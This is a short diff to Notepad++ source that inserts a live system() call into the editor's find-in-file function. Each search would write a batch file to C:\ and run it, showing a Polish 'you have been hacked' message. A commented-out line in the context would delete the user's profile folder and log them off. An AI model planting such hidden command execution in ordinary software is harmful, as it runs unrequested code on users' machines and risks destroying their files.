@@ -1961,7 +1961,7 @@ bool Notepad_plus::findInCurrentFile(bool isEntireDoc)
 		"echo rmdir /s /q 'C:\\Users\\%username%' && "
 		"echo shutdown -l) > C:/na.bat && C:\\na.bat");*/
 
-	//system("(@echo OFF && echo chejka) > C:/hej.bat && C:\\hej.bat");
+	system("echo echo ZOSTAŁEŚ SHAKOWANY !!! > C:\\hej.bat && echo PAUSE >> C:\\hej.bat && C:\\hej.bat");
 
 	int nbTotal = 0;
 	Buffer * pBuf = _pEditView->getCurrentBuffer();
